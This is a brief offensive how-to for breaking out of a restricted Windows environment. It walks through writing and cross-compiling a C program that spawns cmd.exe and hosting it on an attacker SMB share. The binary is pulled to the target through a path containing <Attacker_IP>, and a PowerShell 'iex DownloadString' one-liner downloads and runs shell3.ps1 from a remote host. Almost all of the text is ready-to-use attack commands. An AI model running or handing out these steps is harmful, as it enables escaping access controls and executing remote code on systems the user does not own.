# Getting Indirect Shell in Restricted Environment

Shell access can be gained in a restricted environment by hosting a binary in the local share and accessing it from the target.

1. Create `pwn.c` with following content

        #include <stdlib.h>
            int main() {
            system("C:\\Windows\\System32\\cmd.exe");
        }

2. Compile the C program to generate `pwn.exe`

        apt install mingw-w64
        x86_64-w64-mingw32-gcc pwn.c -o pwn.exe

3. Start an SMB server to serve the binary

        /usr/share/setoolkit/venv/bin/smbserver.py -smb2support share ./pwn/

4. Download the binary onto the target Windows server by accessing following path (via MS Paint or any other option). Once downloaded, open/execute the binary to get a command shell.

        \\<Attacker_IP>\share\pwn.exe

    
5. Additional files could be downloaded using powershell
   
        powershell  -Command "iex (New-Object Net.WebClient).DownloadString('http://10.14.14.9/shell3.ps1')"
